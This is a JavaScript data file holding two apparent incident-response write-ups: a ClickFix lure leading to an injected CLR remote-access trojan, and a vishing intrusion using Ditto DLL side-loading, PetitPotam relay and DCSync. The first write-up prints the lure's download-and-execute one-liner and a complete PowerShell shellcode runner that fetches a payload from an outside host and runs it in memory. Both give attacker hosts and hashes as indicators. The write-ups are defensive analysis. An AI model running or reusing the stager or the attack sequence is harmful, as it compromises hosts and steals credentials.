window.GHOST_WRITEUPS = [
  {
    "id": "clickfix-clr-rat",
    "title": "ClickFix to CLR RAT Delivery Chain",
    "summary": "ClickFix PowerShell lure to Donut shellcode, native MinGW injector into BluetoothUserService svchost, CLR implant sub00, and C2 on 91.92.243.161:3038.",
    "category": "DFIR",
    "date": "2026-07-08",
    "readTime": "7 min",
    "tags": [
      "clickfix",
      "donut",
      "process-injection",
      "clr",
      "rat",
      "delivery-chain"
    ],
    "content": "<h1>ClickFix to CLR RAT Delivery Chain</h1>\n<h2>Summary</h2>\n<pre><code>CLASS      : RAT delivery / process injection\nVECTOR     : ClickFix (PowerShell paste)\nSTAGE 1    : PowerShell stager → in-memory Donut shellcode\nSTAGE 2    : mod_s_enterprise (native MinGW loader / injector)\nSTAGE 3    : student_S.bin (native PE; CLR host candidate)\nEXEC HOST  : svchost.exe -k BthAppGroup -p -s BluetoothUserService\nIMPLANT    : CLR assembly sub00 (in-memory)\nPOST       : Screenshots, Edge DPAPI, additional unbacked CLR loads\nC2         : 91.92.243.161:3038\n</code></pre>\n<p>ClickFix lure instructed the user to run a PowerShell one-liner. The <code>?sid=</code> response was a shellcode runner that fetched Donut-packed <code>/s_enterprise</code>, executed it in memory, and led into a MinGW injector targeting a Bluetooth-related <code>svchost</code> instance. Runtime telemetry showed CLR assembly <code>sub00</code> in that process, then screenshot collection, Edge DPAPI access, and outbound C2.</p>\n<h2>Attack Chain</h2>\n<pre><code>User pastes ClickFix PowerShell command\n  → iex(irm http://158.94.211.77/?sid=&lt;random&gt;)\n  → HTTP response body = PowerShell shellcode runner (Stage 1)\n  → Stage 1 fetches http://158.94.211.76/s_enterprise\n  → VirtualAlloc + Marshal.Copy + CreateThread (in-memory shellcode)\n  → Donut unwrap → mod_s_enterprise (native PE injector)\n  → Fetch http://158.94.211.76/enterprise/student_s.bin\n  → Inject into svchost (BluetoothUserService)\n  → CLR assembly sub00 loads in injected svchost\n  → Screenshot / Edge DPAPI / additional unbacked CLR\n  → C2 91.92.243.161:3038\n</code></pre>\n<h2>Initial Access - ClickFix</h2>\n<p>Fake verification workflow instructed the user to open PowerShell and execute:</p>\n<pre><code class=\"language-powershell\">iex(irm http://158.94.211.77/?sid=&lt;random&gt;)\n</code></pre>\n<p>That request is only the delivery hook. The <code>?sid=</code> response body is the Stage 1 PowerShell script, which is immediately <code>iex</code>'d. User execution of the one-liner is the only initial access mechanism.</p>\n<h2>Stage 1 - PowerShell Shellcode Runner (<code>?sid=</code> response)</h2>\n<p>Script returned by <code>http://158.94.211.77/?sid=&lt;random&gt;</code> after the ClickFix paste. It is not the enterprise payload; it pulls and executes <code>s_enterprise</code> in memory.</p>\n<pre><code>ClickFix one-liner\n  → GET 158.94.211.77/?sid=…\n  → response = this PowerShell script (iex)\n  → GET 158.94.211.76/s_enterprise\n  → RWX alloc + CreateThread on response bytes\n  → Donut / mod_s_enterprise (Stage 2)\n</code></pre>\n<p>Hardcoded next stage: <code>http://158.94.211.76/s_enterprise</code>. No disk write of that blob.</p>\n<h3>Recovered script (<code>?sid=</code> body)</h3>\n<pre><code class=\"language-powershell\">$EenFUwyrhNVtELZM = &quot;http://158.94.211.76/s_enterprise&quot;\ntry {\n    $PjYUazzYSMbkG = Invoke-WebRequest -Uri $EenFUwyrhNVtELZM -UseBasicParsing -ErrorAction Stop\n    $wRiirrT = $PjYUazzYSMbkG.Content\n    $hwJSWjWCoW = $wRiirrT.Length\n    $RMujqTOaRLVOuCSvPp = @&quot;\nusing System;\nusing System.Runtime.InteropServices;\npublic class oYfHgawrHWFwsS {\n    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]\n    public static extern IntPtr GetCurrentProcess();\n    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]\n    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);\n    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]\n    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);\n    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]\n    public static extern uint WaitForSingleObject(IntPtr h, uint ms);\n}\n&quot;@\n    Add-Type -TypeDefinition $RMujqTOaRLVOuCSvPp\n    $jPbjeyTmzEZJJyBT = 0x1000   # MEM_COMMIT\n    $qPqKRSLlXbZN = 0x2000       # MEM_RESERVE\n    $ooplDsMjgwQp = 0x40         # PAGE_EXECUTE_READWRITE\n    $zYdkiDcSrCbO = [oYfHgawrHWFwsS]::VirtualAlloc(\n        [IntPtr]::Zero, $hwJSWjWCoW,\n        $jPbjeyTmzEZJJyBT -bor $qPqKRSLlXbZN, $ooplDsMjgwQp)\n    if ($zYdkiDcSrCbO -eq [IntPtr]::Zero) { throw &quot;Alloc failed&quot; }\n    [System.Runtime.InteropServices.Marshal]::Copy($wRiirrT, 0, $zYdkiDcSrCbO, $hwJSWjWCoW)\n    $XWWJummsE = 0\n    $IiWEOWQYLaoJrL = [oYfHgawrHWFwsS]::CreateThread(\n        [IntPtr]::Zero, 0, $zYdkiDcSrCbO, [IntPtr]::Zero, 0, [ref]$XWWJummsE)\n    if ($IiWEOWQYLaoJrL -eq [IntPtr]::Zero) { throw &quot;Thread failed&quot; }\n    [oYfHgawrHWFwsS]::WaitForSingleObject($IiWEOWQYLaoJrL, 30000) | Out-Null\n    Write-Host &quot;done.&quot;\n}\ncatch {\n    exit 1\n}\n</code></pre>\n<p>Recovered sample omitted the C# class close and here-string terminator (<code>}</code> / <code>\"@</code>) immediately before <code>Add-Type</code>; those two lines are restored so the P/Invoke block is complete. Logic and identifiers match the recovered file.</p>\n<h3>Execution after <code>?sid=</code></h3>\n<table>\n<thead>\n<tr>\n<th>Step</th>\n<th>Action</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Runs as the <code>iex</code> body from <code>158.94.211.77/?sid=…</code></td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>Invoke-WebRequest</code> → <code>http://158.94.211.76/s_enterprise</code></td>\n</tr>\n<tr>\n<td>3</td>\n<td>Response body held in <code>$wRiirrT</code> (length → alloc size)</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>Add-Type</code> embeds kernel32 P/Invoke: <code>VirtualAlloc</code>, <code>CreateThread</code>, <code>WaitForSingleObject</code></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>VirtualAlloc(…, MEM_COMMIT\\|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</code></td>\n</tr>\n<tr>\n<td>6</td>\n<td><code>Marshal.Copy</code> writes shellcode into the RWX region</td>\n</tr>\n<tr>\n<td>7</td>\n<td><code>CreateThread</code> starts execution at that address</td>\n</tr>\n<tr>\n<td>8</td>\n<td><code>WaitForSingleObject</code> (30s) keeps PowerShell alive while the thread runs</td>\n</tr>\n</tbody>\n</table>\n<p>Thread entry is the <code>/s_enterprise</code> download. That blob is Donut-class packing that unwraps to native <code>mod_s_enterprise</code> (Stage 2).</p>\n<h3><code>s_enterprise</code> (next stage)</h3>\n<p>Surface indicators:</p>\n<ul>\n<li>No PE headers; elevated entropy</li>\n<li>High-entropy noise and packing prologue fragments (<code>WAVAWH</code>, <code>A_A^A]A\\_^]</code>)</li>\n<li>Executed as raw shellcode via RWX + <code>CreateThread</code></li>\n</ul>\n<p>Manual reversing of the blob (raw x64 in Ghidra) went further than tooling alone. <code>file</code> / FLOSS treated it as opaque data (essentially no decoded strings), but disassembly showed a full shellcode loader:</p>\n<table>\n<thead>\n<tr>\n<th>Behavior</th>\n<th>Observation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Module walk</td>\n<td>PEB access via <code>GS:[0x30]</code>, enumerate loaded modules</td>\n</tr>\n<tr>\n<td>API resolve</td>\n<td>PE export table parse + name hashing (incl. forwarders)</td>\n</tr>\n<tr>\n<td>Runtime context</td>\n<td>Large structure copied into allocated context for later use</td>\n</tr>\n<tr>\n<td>Payload transfer</td>\n<td>Size / data fields in that context; byte-copy into destination buffer</td>\n</tr>\n<tr>\n<td>Hygiene</td>\n<td>Source and destination buffers wiped after transfer</td>\n</tr>\n</tbody>\n</table>\n<p>Static carving from fixed file offsets failed: size/data fields are runtime-structure-relative, not simple on-disk blob offsets. That matches empty FLOSS output — the stage is a loader framework, not a string-rich implant.</p>\n<p>This does <strong>not</strong> recover a Donut config or prove a specific Donut build. It does support classifying <code>/s_enterprise</code> as Donut-class shellcode that unpacks/maps a native payload rather than as random packed noise. Clean next stage remains <code>mod_s_enterprise</code> via unwrap / memory extraction.</p>\n<h2>Stage 2 - Donut → mod_s_enterprise</h2>\n<p>Donut-class unpack of <code>s_enterprise</code> yields native PE <code>mod_s_enterprise</code>. This binary is the loader/injector that fetches and injects the next stage.</p>\n<h3>capa / ATT&amp;CK</h3>\n<table>\n<thead>\n<tr>\n<th>ATT&amp;CK Tactic</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Defense Evasion</td>\n<td>Process Injection: Thread Execution Hijacking [T1055.003]</td>\n</tr>\n<tr>\n<td>Defense Evasion</td>\n<td>Reflective Code Loading [T1620]</td>\n</tr>\n<tr>\n<td>Discovery</td>\n<td>Process Discovery [T1057] / Software Discovery [T1518]</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>Shared Modules [T1129]</td>\n</tr>\n<tr>\n<td>Privilege Escalation</td>\n<td>Access Token Manipulation [T1134]</td>\n</tr>\n</tbody>\n</table>\n<p>Capabilities include WinHTTP request/response, TLS section/callback patterns, <code>SeDebugPrivilege</code>, process enumeration, thread injection, and execution of shellcode via indirect call / RWX thread.</p>\n<h3>Toolchain / imports</h3>\n<p>MinGW-compiled (GCC 15.x), not MSVC. Notable imports from <code>ADVAPI32.dll</code>, <code>KERNEL32.dll</code>, <code>WINHTTP.dll</code>:</p>\n<pre><code>VirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\nOpenProcess\nAdjustTokenPrivileges\nWinHttp*\n</code></pre>\n<h3>Staging strings (UTF-16LE)</h3>\n<pre><code>svchost.exe\npowershell\n158.94.211.76\nenterprise/student_s.bin\n</code></pre>\n<p>Hardcoded secondary stage path:</p>\n<pre><code>158.94.211.76/enterprise/student_s.bin\n</code></pre>\n<h2>Stage 3 - student_S.bin</h2>\n<p>Retrieved PE:</p>\n<pre><code>student_S.bin: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections\n</code></pre>\n<h3>Not a managed assembly</h3>\n<pre><code class=\"language-bash\">ilspycmd -p -o student_STAGE student_S.bin\n</code></pre>\n<pre><code>ICSharpCode.Decompiler.Metadata.PEFileNotSupportedException:\nPE file does not contain any managed metadata.\n</code></pre>\n<p>Treat as native PE. No managed metadata on disk.</p>\n<h3>sub00 string</h3>\n<pre><code class=\"language-bash\">rabin2 -zz student_S.bin | grep -i sub00\n</code></pre>\n<pre><code>3137  0x00030de8  0x140030de8  5  6  .data  ascii  sub00\n</code></pre>\n<p>Single <code>.data</code> reference. Runtime correlation in Stage 4.</p>\n<h2>Stage 4 - Injection and CLR Load</h2>\n<p>First visible execution remains inside PowerShell. Defender records in-memory CLR assembly:</p>\n<pre><code>jq5ksud0\n</code></pre>\n<p>Then:</p>\n<pre><code>CreateRemoteThreadApiCall\n</code></pre>\n<p>Target process:</p>\n<pre><code>svchost.exe -k BthAppGroup -p -s BluetoothUserService\n</code></pre>\n<p>Matches injection capability flagged by capa on <code>mod_s_enterprise</code>. That remote thread places subsequent code into a legitimate service host.</p>\n<p>Second CLR assembly loads inside the same BluetoothUserService <code>svchost</code>:</p>\n<pre><code>sub00\n</code></pre>\n<p>Name matches the <code>student_S.bin</code> <code>.data</code> string.</p>\n<table>\n<thead>\n<tr>\n<th>Source</th>\n<th>Finding</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Static (<code>student_S.bin</code>)</td>\n<td>Native PE; no managed metadata; string <code>sub00</code> in <code>.data</code></td>\n</tr>\n<tr>\n<td>Runtime (Defender)</td>\n<td>CLR assembly named <code>sub00</code> in injected <code>svchost</code></td>\n</tr>\n</tbody>\n</table>\n<p>Name correlation is strong. Mechanical link (e.g. manual CLR hosting via <code>mscoree.dll</code> / <code>CLRCreateInstance</code>) was not confirmed from the import table captured in this pass. Strongest injection import evidence sits on <code>mod_s_enterprise</code>; <code>student_S.bin</code> injection primitive is not fully resolved.</p>\n<h2>Stage 5 - Post-Injection Behavior</h2>\n<p>Injected residence is a normal <code>svchost</code> service instance (<code>BluetoothUserService</code>), not Bluetooth-specific malware logic.</p>\n<p>Defender telemetry from the injected process:</p>\n<table>\n<thead>\n<tr>\n<th>Behavior</th>\n<th>Observation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Screenshots</td>\n<td><code>ScreenshotTaken</code> from injected service process</td>\n</tr>\n<tr>\n<td>Credential access</td>\n<td><code>DPAPI Accessed / Microsoft Edge</code></td>\n</tr>\n<tr>\n<td>Further payloads</td>\n<td>Multiple unbacked CLR assemblies loaded dynamically; no additional disk writes observed</td>\n</tr>\n</tbody>\n</table>\n<h2>Stage 6 - Command and Control</h2>\n<p>Post-execution infrastructure (not used for initial delivery):</p>\n<pre><code>91.92.243.161:3038\n</code></pre>\n<p>Sandbox execution of <code>student_S.bin</code> contacted the same host. Classification tags: RAT / Generic Agent / C2 Activity.</p>\n<p>~28 MB outbound traffic observed in the surrounding window. Treat as suspicious outbound transfer until <code>DeviceNetworkEvents</code> rows confirm direction and content; not labeled confirmed exfiltration from current evidence alone.</p>\n<h3>Infrastructure roles</h3>\n<pre><code>Host                Role\n------------------  --------------------------------------------------------\n158.94.211.77       ClickFix delivery (`?sid=` stager host)\n158.94.211.76       Payload staging (/s_enterprise, /enterprise/student_s.bin)\n91.92.243.161:3038  Operational C2\n</code></pre>\n<h2>Artifacts</h2>\n<h3>s_enterprise</h3>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Type</td>\n<td>Donut shellcode wrapper (packed / high entropy)</td>\n</tr>\n<tr>\n<td>Disk write</td>\n<td>None (in-memory via PowerShell)</td>\n</tr>\n<tr>\n<td>Unwraps to</td>\n<td><code>mod_s_enterprise</code></td>\n</tr>\n</tbody>\n</table>\n<h3>mod_s_enterprise</h3>\n<pre><code>MD5      881d500742127a52ae5a52a29de66ffb\nSHA1     c4b150ad42a10b514a643357c8d7f9a9105f3ba1\nSHA256   4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a\nFormat   PE32+, x86-64, MinGW/GCC 15.x\nRole     Injector / secondary stage fetcher\n</code></pre>\n<h3>student_S.bin</h3>\n<pre><code>Type     PE32+, x64, native (no managed metadata)\nCompiled 2026-07-08 23:09:10 UTC\nSHA256   53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db\nString   sub00 (.data)\n</code></pre>\n<h2>Indicators of Compromise</h2>\n<h3>Hashes</h3>\n<pre><code>File               Type    Hash\n-----------------  ------  ----------------------------------------------------------------\nmod_s_enterprise   MD5     881d500742127a52ae5a52a29de66ffb\nmod_s_enterprise   SHA1    c4b150ad42a10b514a643357c8d7f9a9105f3ba1\nmod_s_enterprise   SHA256  4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a\nstudent_S.bin      SHA256  53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db\n</code></pre>\n<h3>Network</h3>\n<pre><code>Indicator                                          Role\n-------------------------------------------------  --------------------------------\n158.94.211.77                                      ClickFix / initial PowerShell stage\n158.94.211.76                                      Payload host\nhttp://158.94.211.76/s_enterprise                  Donut shellcode\nhttp://158.94.211.76/enterprise/student_s.bin      Secondary PE\n91.92.243.161:3038                                 Operational C2\n</code></pre>\n<h3>Process / runtime</h3>\n<pre><code>svchost.exe -k BthAppGroup -p -s BluetoothUserService\nCreateRemoteThreadApiCall → BluetoothUserService\nCLR assemblies (in-memory): jq5ksud0, sub00\n</code></pre>"
  },
  {
    "id": "ditto-delivery-chain",
    "title": "Ditto DLL Side-Loading and Domain Compromise",
    "summary": "Quick Assist to pdf24/userenv.dll (blocked) then Ditto with fake vcruntime140.dll, DNS C2, and KRBTGT compromise in under one hour.",
    "category": "DFIR",
    "date": "2026-06-24",
    "readTime": "9 min",
    "tags": [
      "quick-assist",
      "ditto",
      "dll-sideload",
      "domain-compromise",
      "social-engineering"
    ],
    "content": "<h1>Ditto DLL Side-Loading and Domain Compromise</h1>\n<h2>Summary</h2>\n<pre><code>CLASS      : KRBTGT compromise / domain intrusion\nVECTOR     : Vishing + Microsoft Quick Assist\nIMPLANT    : Botan RAT via userenv.dll (pdf24) then fake vcruntime140.dll (Ditto)\nC2         : Malformed DNS over UDP/53 → 45.55.94.174\nTTX        : Domain compromise &lt; 60 minutes\nRANSOMWARE : Not observed\nOBJECTIVE  : Persistent privileged access\n</code></pre>\n<p>Vishing led to an accepted Microsoft Quick Assist session. From that interactive user context, the operator ran host recon, then pulled two MSI packages from the same staging host. Stage 1 (<code>pdf24.exe</code> + malicious <code>userenv.dll</code>) was blocked by Defender. Stage 2 installed a Ditto-shaped tree under the user profile: legitimate <code>Ditto.exe</code> side-loading a fake <code>vcruntime140.dll</code> (Botan RAT, same family as Stage 1), with Startup-folder persistence.</p>\n<p>The implant beaconed over UDP/53 to a non-resolver IP with malformed DNS payloads. That foothold enabled domain-level actions: EFSRPC coercion against DC01, NTLM relay of the DC auth, DCSync (<code>DRSGetNCChanges</code>), KRBTGT/privileged hash extraction, then RDP lateral movement as a Domain Admin service account. GetScreen and DWAgent were added on secondary hosts. No ransomware was observed.</p>\n<h2>Attack Chain</h2>\n<pre><code>Social engineering (vishing)\n  → Quick Assist session\n  → Host recon (whoami, ipconfig, net user /domain)\n  → pd_53updates.msi → pdf24.exe + userenv.dll (blocked by Defender)\n  → dt_53updates.msi (successful)\n  → Ditto.exe side-loads fake vcruntime140.dll from %LOCALAPPDATA%\\Ditto\\\n  → Botan RAT beacon (AES-256-GCM, UDP/53 C2)\n  → PetitPotam (\\PIPE\\efsrpc → DC01)\n  → NTLM relay (DC01 → 167.172.212.171)\n  → DCSync (DRSGetNCChanges)\n  → KRBTGT / privileged hash extraction\n  → Lateral movement via &lt;svc_account&gt; (RDP)\n  → GetScreen + DWAgent persistence\n</code></pre>\n<h2>Initial Access</h2>\n<p>Microsoft Quick Assist was initiated by an external party and accepted by the user after a vishing call. The tool ran in the logged-on user's context, giving the operator an interactive session without a separate privilege-elevation step at this stage.</p>\n<h2>Host Reconnaissance</h2>\n<p>Within about two minutes of session start, interactive recon established user context, network placement, internal reachability, and domain membership:</p>\n<pre><code>whoami\nwhoami /groups\nipconfig /all\nping &lt;internal-host&gt;\nnslookup &lt;internal-host&gt;\nnet user /domain\n</code></pre>\n<p>That output fed the decision to proceed with payload delivery on this host.</p>\n<h2>Payload Delivery</h2>\n<h3>Stage 1 — Blocked (pdf24 + userenv.dll)</h3>\n<pre><code>URL    : http://&lt;C2-DROP&gt;/pd_53updates.msi\nSOURCE : 45.61.163.226\n</code></pre>\n<p>Stage 1 attempted DLL side-loading under a PDF-utility host (<code>pdf24.exe</code>) with malicious <code>userenv.dll</code> adjacent to the host binary. Defender blocked the side-load:</p>\n<pre><code>Potential Side-Loaded Behavior Was Blocked\n</code></pre>\n<p><code>pdf24.exe</code> / the associated payload was quarantined. Static strings from Stage 1 <code>userenv.dll</code> already identify the same Botan RAT family later used under Ditto: MinGW/GCC 13-win32, Botan 3 AES-GCM, base64 C2 <code>NDUuNTUuOTQuMTc0</code> → <code>45.55.94.174</code>, implant GUID <code>573d2149-b7b1-4d54-b0d4-403195f3984e</code>, and the JSON beacon template. Compile stamp strings include <code>Jun 11 2026</code>.</p>\n<p>Approximately three minutes later, the operator switched host packages and delivered Stage 2 from the same staging IP.</p>\n<h3>Stage 2 — Successful (Ditto + fake vcruntime140.dll)</h3>\n<pre><code>URL    : http://&lt;C2-DROP&gt;/dt_53updates.msi\nSOURCE : 45.61.163.226\nSHA256 : 849a2c808694426b2afb8848dcea00f9e64538a503b05543e38af1fdee9dd9f8\nSIZE   : ~4.8 MB\n</code></pre>\n<p>The MSI executed and wrote a Ditto-shaped tree under the user profile: legitimate <code>Ditto.exe</code> as host process, fake <code>vcruntime140.dll</code> as implant, companion libraries/settings to complete the install appearance, and a Startup shortcut for logon persistence.</p>\n<h4>Dropped paths</h4>\n<pre><code>%LOCALAPPDATA%\\Ditto\\Ditto.exe              ← host (legitimate Ditto)\n%LOCALAPPDATA%\\Ditto\\vcruntime140.dll       ← FAKE / implant (side-loaded)\n%LOCALAPPDATA%\\Ditto\\mfc140u.dll\n%LOCALAPPDATA%\\Ditto\\vcruntime140u.dll\n%LOCALAPPDATA%\\Ditto\\msvcp140.dll\n%LOCALAPPDATA%\\Ditto\\ICU_Loader.dll\n%LOCALAPPDATA%\\Ditto\\Addins\\DittoUtil.dll\n%LOCALAPPDATA%\\Ditto\\language\\English.xml\n%LOCALAPPDATA%\\Ditto\\Ditto.Settings\n</code></pre>\n<h4>Persistence</h4>\n<pre><code>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Ditto.lnk\n</code></pre>\n<h2>DLL Side-Loading</h2>\n<p>On process start, <code>Ditto.exe</code> resolves imports via the standard DLL search order. A local <code>vcruntime140.dll</code> in the application directory is preferred over <code>C:\\Windows\\System32\\</code>. The legitimate host therefore loads attacker-controlled code in-process under a trusted-looking process tree, without a standalone unsigned RAT EXE on disk.</p>\n<h3>Malicious libraries (confirmed)</h3>\n<pre><code>Stage   Host binary     Malicious DLL        Role\n------  --------------  -------------------  ------------------------------------------\n1       pdf24.exe       userenv.dll          Side-load implant (blocked by Defender)\n2       Ditto.exe       vcruntime140.dll     Fake VC++ runtime; successful side-load\n</code></pre>\n<p>Stage 2 implant:</p>\n<pre><code>Path     %LOCALAPPDATA%\\Ditto\\vcruntime140.dll\nSHA256   9d20d9f17dddedd3ea057b68e42ef2ca86ff7c776d59b045213f377ba1707291\nRole     Fake vcruntime140; Botan RAT loaded by Ditto.exe\n</code></pre>\n<p>Stage 1 <code>userenv.dll</code> is the same family under the PDF host (earlier attempt, not a separate actor). Remaining files under <code>%LOCALAPPDATA%\\Ditto\\</code> support install appearance only; the primary Stage 2 implant is the fake <code>vcruntime140.dll</code>.</p>\n<h3>Host choice (Ditto)</h3>\n<p>Ditto is open-source and commonly repackaged. As a clipboard manager it already uses APIs that look suspicious outside that product context:</p>\n<pre><code>AddClipboardFormatListener\nSetWindowsHookEx\nFindShellTrayWindow\nSendNotifyMessage\nProcess enumeration\n</code></pre>\n<p>Running the implant inside <code>Ditto.exe</code> places those behaviors in a process where clipboard, hooks, and window enumeration are expected, and local DLL search order makes side-loading straightforward.</p>\n<h3>Static strings (userenv.dll / fake vcruntime140.dll)</h3>\n<p>Strings from Stage 1 <code>userenv.dll</code>, consistent with the Stage 2 fake <code>vcruntime140.dll</code> family:</p>\n<pre><code>GCC: (GNU) 13-win32\nlibgcc_s_dw2-1.dll\nBotan 3.0.0 (unreleased, revision unknown, distribution unspecified)\nAES-256/GCM\nGHASH requires a 128-bit nonce\nInvalid authentication tag\nBOTAN_MLOCK_POOL_SIZE\nRtlGenRandom / SystemFunction036\nNDUuNTUuOTQuMTc0\n573d2149-b7b1-4d54-b0d4-403195f3984e\n{&quot;name&quot;: &quot;%s&quot;, &quot;build_date&quot;: &quot;%s %s&quot;, &quot;arch&quot;: &quot;windows&quot;, &quot;username&quot;: &quot;%s&quot;, &quot;pid&quot;: &quot;%d&quot; }\nJun 11 2026\n</code></pre>\n<p>MinGW-w64 build with statically linked Botan 3. Stage 1 malicious <code>userenv.dll</code> also carries export-forward style strings to legitimate SysWOW64 userenv APIs, consistent with a proxy DLL: present as <code>userenv.dll</code> for side-loading under pdf24 while wrapping the Botan implant.</p>\n<h3>Imports and capabilities</h3>\n<pre><code>Threading        : CreateThread, ExitThread, ResumeThread\nSynchronization  : InitializeCriticalSection, SleepConditionVariableCS\nMemory           : VirtualAlloc, VirtualProtect, VirtualFree, VirtualLock\nFilesystem       : FindFirstFileA, FindNextFileA\nNetworking       : WSAStartup, WSACleanup, getaddrinfo, closesocket\nProfiling        : GetComputerNameA, GetUserNameA, GetSystemInfo,\n                   GlobalMemoryStatusEx, GetTickCount\nEvasion          : IsNativeVhdBoot, DisableThreadLibraryCalls\nDynamic Loading  : LoadLibraryA, GetProcAddress\n</code></pre>\n<p>Multi-threaded work, in-memory allocation/execution, Winsock networking, directory enumeration, host profiling, and dynamic API resolution.</p>\n<h3>C2 address (Base64)</h3>\n<pre><code>NDUuNTUuOTQuMTc0  →  45.55.94.174\n</code></pre>\n<h3>Beacon format</h3>\n<pre><code class=\"language-json\">{\n  &quot;name&quot;:      &quot;%s&quot;,\n  &quot;build_date&quot;:&quot;%s %s&quot;,\n  &quot;arch&quot;:      &quot;windows&quot;,\n  &quot;username&quot;:  &quot;%s&quot;,\n  &quot;pid&quot;:       &quot;%d&quot;\n}\n</code></pre>\n<p>Runtime fields: hostname, compile timestamp, architecture (<code>windows</code>), logged-on user, PID. Beacon payload encrypted with AES-256-GCM before send.</p>\n<h2>C2 — Malformed DNS over UDP/53</h2>\n<p>Sandbox and network telemetry:</p>\n<pre><code>DESTINATION : 45.55.94.174\nPORT        : 53\nPROTOCOL    : UDP\nORIGIN      : %LOCALAPPDATA%\\Ditto\\Ditto.exe\n</code></pre>\n<p>Traffic targeted an attacker IP on 53/udp, not a corporate or public resolver. Packet contents were not valid DNS queries (DNS-as-transport). AES-GCM encrypts the beacon on the channel established by the side-loaded implant.</p>\n<p>That C2 path provided operator control on the workstation, which then drove the post-exploitation sequence below.</p>\n<h2>Post-Exploitation</h2>\n<h3>PetitPotam / NTLM relay</h3>\n<p>About nine minutes after the successful MSI:</p>\n<pre><code>TARGET    : DC01\nPIPE      : \\PIPE\\efsrpc\nINTERFACE : EFSRPC (MS-EFSR)\n</code></pre>\n<p>EFSRPC coercion forced DC01 to authenticate to an attacker-chosen destination. Immediately after, DC01 opened outbound auth:</p>\n<pre><code>SOURCE : DC01 (ntoskrnl context)\nDEST   : 167.172.212.171 (DigitalOcean)\n</code></pre>\n<p>Consistent with NTLM relay of the coerced DC authentication to external infrastructure. Relayed DC material then enabled directory replication rights used in the next step.</p>\n<h3>DCSync</h3>\n<p>Eleven minutes after the first MSI:</p>\n<pre><code>OPERATION : DRSGetNCChanges\nTARGET    : DC01\nSOURCE    : &lt;workstation&gt;\n</code></pre>\n<p><code>DRSGetNCChanges</code> from the workstation is DCSync (Mimikatz, Impacket, or equivalent), implying credentials with directory replication rights obtained via the relay path. Material extracted included at least:</p>\n<ul>\n<li><code>krbtgt</code></li>\n<li>privileged / service account hashes</li>\n<li>other high-value directory secrets</li>\n</ul>\n<p>KRBTGT compromise enables forged TGTs until a double KRBTGT password reset (and usually broader credential reset). That reset was executed later the same day.</p>\n<h3>Privileged service account</h3>\n<p>Directory review identified <code>&lt;svc_account&gt;</code>: Domain Administrator membership, no meaningful logon or source-host restrictions, long-unchanged password. DCSync provided its material. That account enabled multi-host RDP without further escalation on the secondary targets.</p>\n<h3>Lateral movement and extra persistence</h3>\n<p>RDP as <code>&lt;svc_account&gt;</code>:</p>\n<pre><code>TARGET 1 : &lt;print-server&gt;\nTARGET 2 : &lt;test-server&gt;\nPROTOCOL : RDP (TCP/3389)\n</code></pre>\n<p>Additional remote-access tools:</p>\n<pre><code>&lt;print-server&gt; : GetScreen.me agent\n&lt;test-server&gt;  : DWAgent\n</code></pre>\n<p>Resulting footholds: Ditto/Botan on the original workstation, GetScreen on the print server, DWAgent on the test server.</p>\n<h2>Timeline (MDT)</h2>\n<pre><code>13:29  Quick Assist session established\n13:31  Recon commands (whoami, ping, ipconfig, nslookup)\n13:36  Stage 1 MSI downloaded from 45.61.163.226\n13:38  Stage 1 side-load blocked (pdf24.exe + userenv.dll)\n13:39  Defender alert → SOC queue\n13:39  Stage 2 MSI (dt_53updates.msi) downloaded; Ditto + fake vcruntime140.dll\n13:43  ITSM ticket created\n13:45  Internal enumeration (Kerberos, LDAP, SMB, RDP)\n13:47  PetitPotam activity against DC01 (\\PIPE\\efsrpc)\n13:48  DC01 outbound auth to 167.172.212.171\n13:57  pdf24.exe execution blocked\n13:59  DCSync (DRSGetNCChanges) observed\n14:01  Kerberos TGS requests against DC01\n14:09  RDP to &lt;test-server&gt; as &lt;svc_account&gt;\n14:14  RDP to &lt;print-server&gt; as &lt;svc_account&gt;\n14:15  GetScreen.me downloaded\n14:17  GetScreen persistence on &lt;print-server&gt;\n14:17  DWAgent deployed on &lt;test-server&gt;\n15:53  Workstation isolated\n~21:00 Domain-wide password reset + double KRBTGT reset\n</code></pre>\n<ul>\n<li>First foothold to multi-host persistence: <strong>48 minutes</strong></li>\n<li>First foothold to KRBTGT compromise: <strong>30 minutes</strong></li>\n</ul>\n<h2>MITRE ATT&amp;CK Mapping</h2>\n<table>\n<thead>\n<tr>\n<th>Tactic</th>\n<th>Technique</th>\n<th>ID</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Initial Access</td>\n<td>Remote Services: Quick Assist abuse</td>\n<td>T1219</td>\n</tr>\n<tr>\n<td>Initial Access</td>\n<td>Phishing: Voice / Vishing</td>\n<td>T1566.004</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>User Execution: Malicious File (MSI)</td>\n<td>T1204.002</td>\n</tr>\n<tr>\n<td>Execution</td>\n<td>Command and Scripting Interpreter</td>\n<td>T1059</td>\n</tr>\n<tr>\n<td>Persistence</td>\n<td>Boot or Logon Autostart: Startup 